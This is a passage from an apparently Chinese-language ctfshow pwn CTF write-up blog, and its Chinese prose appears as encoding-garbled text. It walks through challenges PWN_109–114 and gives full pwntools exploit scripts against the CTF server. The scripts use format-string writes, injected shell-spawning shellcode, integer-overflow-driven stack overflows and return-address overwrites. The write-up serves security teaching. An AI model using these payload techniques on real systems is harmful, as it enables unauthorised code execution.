</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Quit!!!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Quit!!!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">()))</span>
</span></span><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Quit!!!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿è¡Œè·³å‡ºgdbç•Œé¢åä¸€ç›´niæ­¥è¿›è°ƒè¯•ï¼ˆè¿‡ç¨‹è¾ƒé•¿è€å¿ƒ&hellip;ï¼‰ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/400.png"
	width="1720"
	height="854"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/400_hu_8e194ef8df89ec30.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/400_hu_5e8775b7c5ffad3f.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="201"
		data-flex-basis="483px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="err">00:0000â”‚</span> <span class="nf">esp</span>  <span class="mh">0xff86975c</span> <span class="err">â€”â–¸</span> <span class="mh">0xf7dd5fa1</span> <span class="p">(</span><span class="nv">__libc_start_main</span><span class="o">+</span><span class="mi">241</span><span class="p">)</span> <span class="err">â—‚â€”</span> <span class="nv">add</span>    <span class="nb">esp</span><span class="p">,</span> <span class="mh">0x10</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°æœ‰æ±‡ç¼–æŒ‡ä»¤äº†ï¼Œæ„æ€æ˜¯è¯¥åœ°å€å¯¹åº”çš„ <strong>æ±‡ç¼–æŒ‡ä»¤</strong>ï¼šâ€œå°†æ ˆé¡¶æŒ‡é’ˆï¼ˆESPï¼‰å¢åŠ  0x10ï¼ˆ16 å­—èŠ‚ï¼‰â€ï¼Œä½œç”¨æ˜¯æ ˆå¹³è¡¡ï¼ˆæ¸…ç†å‡½æ•°è°ƒç”¨æ—¶å‹å…¥æ ˆçš„å‚æ•°ï¼‰ã€‚</p>
<p>niæ­¥è¿›åˆ°<code>lea    esp, [ecx - 4]</code>å†æ­¥è¿›ä¸€æ­¥ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/401.png"
	width="1736"
	height="465"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/401_hu_b4b6720681ea14d8.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/401_hu_7d7479f990267384.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="373"
		data-flex-basis="896px"
	
></p>
<p>å¯ä»¥çœ‹åˆ°ä¸‹æ–¹çº¢æ¡†çš„æ˜¯<code>ebp+4</code>ï¼Œå’Œä¹‹å‰æ³„éœ²retçš„åœ°å€æ˜¯ä¸€æ ·çš„ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/399.png"
	width="1235"
	height="425"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/399_hu_c254cec8f7c76c6d.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/399_hu_fb4e34a8ea49a659.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="290"
		data-flex-basis="697px"
	
></p>
<p>ä¸‹æ–¹çš„å›¾ä½ çœ‹ä¸å¤ªæ‡‚ä¹Ÿæ²¡äº‹ï¼Œä¸Šé¢ä¸‰å¼ åº”è¯¥èƒ½çœ‹æ‡‚äº†ğŸ˜„ã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/402.png"
	width="1670"
	height="680"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/402_hu_a6702009b047ea13.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/402_hu_1ca30e2588c4124c.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="245"
		data-flex-basis="589px"
	
></p>
<p>æˆ‘ä»¬çŸ¥é“äº†å®é™…çš„åŠ¨æ€ç¼“å†²åŒºï¼š<code>0x41C</code></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/398.png"
	width="720"
	height="224"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/398_hu_6114d4a4ae9ae303.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/398_hu_1276f74c52c3877e.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="321"
		data-flex-basis="771px"
	
></p>
<p>æœ€ç»ˆexpï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28106</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Quit!!!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">stack</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="n">stack</span> <span class="o">+</span> <span class="mh">0x41C</span>  <span class="c1">#æ˜¯0x41Cä¸æ˜¯0x40Cå“¦ï¼ï¼</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">16</span><span class="p">,{</span><span class="n">ret</span><span class="p">:</span><span class="n">stack</span><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Quit!!!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Quit!!!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">()))</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Quit!!!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é“é¢˜è®©æˆ‘å¾ˆæƒŠè®¶ï¼Œå‘åˆ°æˆ‘äº†ï¼Œåœ¨è¦†ç›–retè¿”å›åœ°å€å‰å¤šäº†ä¸€ä¸ªæ±‡ç¼–æŒ‡ä»¤ã€‚è¿™é“é¢˜å’Œæ•´æ•°å®‰å…¨æ¯«æ— å…³ç³»&hellip;.</p>
<h3 id="pwn_110">PWN_110
</h3><p>é¢˜ç›®ï¼šæº¢å‡ºæº¢å‡ºæº¢å‡ºã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/403.png"
	width="795"
	height="230"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/403_hu_87c3fcadb1877e6e.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/403_hu_6b443d50dc4d5342.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="345"
		data-flex-basis="829px"
	
></p>
<p>32ä½â¼ä¹ä¿æŠ¤å…¨å…³ã€‚</p>
<p>IDA32åˆ†æï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/404.png"
	width="874"
	height="196"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/404_hu_16eafe4b10484bfb.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/404_hu_9754cecfb2c38776.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="445"
		data-flex-basis="1070px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/405.png"
	width="790"
	height="466"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/405_hu_4d2d9a34d88fa006.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/405_hu_440ea856665ba708.png 1024w"
	loading="lazy"
	
		alt="inputå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="169"
		data-flex-basis="406px"
	
></p>
<p><code>v1</code> æ˜¯ <code>unsigned __int16</code>ï¼ˆæ— ç¬¦å· 16 ä½ï¼‰ï¼Œè‹¥ç”¨æˆ·è¾“å…¥ <code>v1 = 0xFFFF</code>ï¼ˆè™½ä»£ç ä¸­ç”¨ <code>%hd</code> è¯»å–ä¸ºæœ‰ç¬¦å· 16 ä½ï¼Œä½†å®é™…å­˜å‚¨æ˜¯æ— ç¬¦å·ï¼‰ï¼Œå¯èƒ½ç»•è¿‡ <code>&gt;1024</code> çš„æ£€æŸ¥ï¼ˆå–å†³äºç¼–è¯‘å™¨å®ç°ï¼‰ï¼Œç›´æ¥è¯»å–è¿œè¶… 1024 å­—èŠ‚çš„æ•°æ®ï¼Œå½»åº•è¦†ç›–æ ˆå¸§ã€‚</p>
<p>ç¨‹åºä¸»è¦é€»è¾‘å¾ˆç®€å•ï¼Œä½¿â½¤ scanf å‡½æ•°è¯»å–â¼€ä¸ªçŸ­æ•´æ•°ï¼ˆ %hd è¡¨ç¤ºçŸ­æ•´æ•°æ ¼å¼ï¼‰å¹¶å°†å…¶å­˜å‚¨åœ¨ v1ä¸­ã€‚åˆ¤æ–­å®ƒæ˜¯å¦â¼¤äº1024ï¼Œå¦‚æœå¤§äºçš„è¯åˆ™ç›´æ¥é€€å‡ºï¼›å°äºçš„è¯ï¼Œå°±è®©ä½ è¾“â¼Šå­—ç¬¦ï¼Œè¾“â¼Šçš„å­—èŠ‚æ•°ä¸ºåˆšæ‰è¾“â¼Šçš„æ•°å­—ã€‚è¿™ä¸ªå‡½æ•°ç»“æŸä¹‹åï¼Œå¼€å§‹â½†é™å¾ªç¯å»æ‰§è¡Œputsæ‰“å°åˆšæ‰è¾“â¼Šçš„å­—ç¬¦ã€‚</p>
<p>åœ¨è¾“â¼Šbufçš„å¤§å°æ—¶ï¼Œå¯ä»¥æ§åˆ¶bufçš„å¤§å°ï¼Œè¾“â¼Š-1åbufçš„å¤§å°æ˜¯65535ï¼Œè¿™é‡Œæœ‰æ•´æ•°æº¢å‡ºï¼Œå¹¶ä¸”æ‰“å°å‡ºbufçš„åœ°å€ã€‚</p>
<p>é‚£ä¹ˆå¤§è‡´æ€è·¯å°±æ˜¯å…ˆè¾“å…¥-1é€ æˆæ•´æ•°æº¢å‡ºï¼Œä»è€Œèƒ½è®©readè¯»å–è¶…é•¿å­—ç¬¦ä¸²ï¼Œé€ æˆ<code>buf[1025]</code>æº¢å‡ºï¼Œå¡«å……è‡³<code>ebp+4</code>ï¼ˆ0x41B+4ï¼‰ï¼Œæ­¤æ—¶åˆšå¥½å¡«å……åˆ°è¿”å›åœ°å€çš„å‚¨å­˜ä½ç½®ï¼Œåœ¨ä¹‹å‰å·²ç»æ³„éœ²äº†bufåœ°å€ï¼Œæˆ‘ä»¬å°±å¯ä»¥è¿”å›åˆ°bufï¼Œæ‰§è¡Œbufé‡Œé¢çš„å†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨bufå†…å†™å…¥shellcodeå°±å¥½äº†ã€‚</p>
<p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28134</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;-1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x41b</span><span class="o">+</span><span class="mh">0x4</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="bypasså®‰å…¨æœºåˆ¶">Bypasså®‰å…¨æœºåˆ¶
</h2><p>å„ç§æ ˆçš„å®‰å…¨æœºåˆ¶ç»•è¿‡çš„è¿›é˜¶æ‰‹æ³•ã€‚</p>
<h3 id="pwn_111">PWN_111
</h3><p>é¢˜ç›®ï¼šæ²¡éš¾åº¦ã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/406.png"
	width="766"
	height="204"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/406_hu_60b0d386a3453cad.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/406_hu_d9f4ab3b6afca6f7.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="375"
		data-flex-basis="901px"
	
></p>
<p>64ä½ä»…å¼€å¯NXä¿æŠ¤ã€‚</p>
<p>IDA64åˆ†æï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/407.png"
	width="775"
	height="174"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/407_hu_996614e6d554ffb3.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/407_hu_678b90d08626ddc5.png 1024w"
	loading="lazy"
	
		alt="ctfshowå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="445"
		data-flex-basis="1068px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/408.png"
	width="580"
	height="395"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/408_hu_309d532ba909a809.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/408_hu_d07273e6008a7a9a.png 1024w"
	loading="lazy"
	
		alt="_do_globalå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="146"
		data-flex-basis="352px"
	
></p>
<p>è¿™è¿˜æ˜¯ä¸ªåé—¨å‡½æ•°ï¼Œé‚£ä¹ˆç®€å•äº†ï¼Œåªéœ€è¦æ ˆæº¢å‡ºï¼Œå°†è¿”å›åœ°å€è¦†ç›–æˆè¿™ä¸ªå‡½æ•°çš„åœ°å€å°±å¯ä»¥æ‹¿åˆ°flagäº†ã€‚</p>
<p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28180</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./pwn&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_do_global&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x80</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="pwn_112">PWN_112
</h3><p>é¢˜ç›®ï¼š æ»¡è¶³ä¸€å®šæ¡ä»¶å³å¯ã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/409.png"
	width="719"
	height="206"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/409_hu_6137b44d30d53a8d.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/409_hu_7326294cca95765b.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="349"
		data-flex-basis="837px"
	
></p>
<p>32ä½ä¿æŠ¤å…¨å¼€ï¼Œå…¶ä¸­éƒ¨åˆ†å¼€å¯RELROã€‚</p>
<p>IDA32åˆ†æï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/410.png"
	width="904"
	height="739"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/410_hu_fd83fa6bab6137fc.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/410_hu_e0e67bef1de79a93.png 1024w"
	loading="lazy"
	
		alt="ctfshowå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="122"
		data-flex-basis="293px"
	
></p>
<p>è¿ç»­è·Ÿè¿›å‡ æ¬¡å‡½æ•°å°±çœ‹åˆ°åé—¨å‡½æ•°äº†ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/411.png"
	width="755"
	height="355"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/411_hu_74f3b6eb1e174577.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/411_hu_ee4480a4fd74d683.png 1024w"
	loading="lazy"
	
		alt="_do_globalå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="212"
		data-flex-basis="510px"
	
></p>
<p>ä¹Ÿå°±æ˜¯è¯´éœ€è¦var[13] != 17LLæ‰èƒ½getshellï¼Œä½†æ­¤å‰å·²ç»è¢«èµ‹å€¼ä¸º0äº†ï¼Œé‚£å°±å¯ä»¥æ³¨å…¥åƒåœ¾æ•°æ®å¡«å……var[0]~var[13]ï¼Œvar[14]å¡«å……æˆ17å°±å¯ä»¥äº†ã€‚</p>
<p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28307</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">91</span><span class="p">)</span><span class="o">*</span><span class="mi">13</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">17</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="pwn_113å¾…å®š">PWN_113ï¼ˆå¾…å®šï¼‰
</h3><p>é¢˜ç›®ï¼šç†æ¸…é€»è¾‘ï¼Œé¢˜ç›®ä¸éš¾ã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/412.png"
	width="736"
	height="203"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/412_hu_d3952ea187ecd78f.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/412_hu_f63ca1507dd8c783.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="362"
		data-flex-basis="870px"
	
></p>
<p>64ä½ç¨‹åºå®Œå…¨å¼€å¯RELROä¿æŠ¤ï¼Œå¼€å¯NXä¿æŠ¤ã€‚</p>
<p>IDA64åˆ†æï¼š</p>
<h3 id="pwn_114">PWN_114
</h3><p>é¢˜ç›®ï¼šç°åœ¨ä½ åº”è¯¥å­¦ä¼šäº†å§ã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/413.png"
	width="715"
	height="199"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/413_hu_d3adb27bacd1dfbc.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/413_hu_9ea89df35e30193e.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="359"
		data-flex-basis="862px"
	
></p>
<p>64ä½ä»…å…³é—­Canaryã€‚</p>
<p>IDA64åˆ†æï¼š
<img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/414.png"
	width="729"
	height="256"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/414_hu_45e1540d8d16b6b3.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/414_hu_2397b6ec5c05965d.png 1024w"
	loading="lazy"
	
		alt="flagishereå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="284"
		data-flex-basis="683px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/415.png"
	width="875"
	height="669"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/415_hu_439fc7ef4a36b9fe.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/415_hu_5023e19c76b6deae.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="130"
		data-flex-basis="313px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/416.png"
	width="659"
	height="126"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/416_hu_f327b34642ae801b.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/416_hu_c27b440aae66f534.png 1024w"
	loading="lazy"
	
		alt="ctfshowå‡½æ•°"
	
	
		class="gallery-image" 
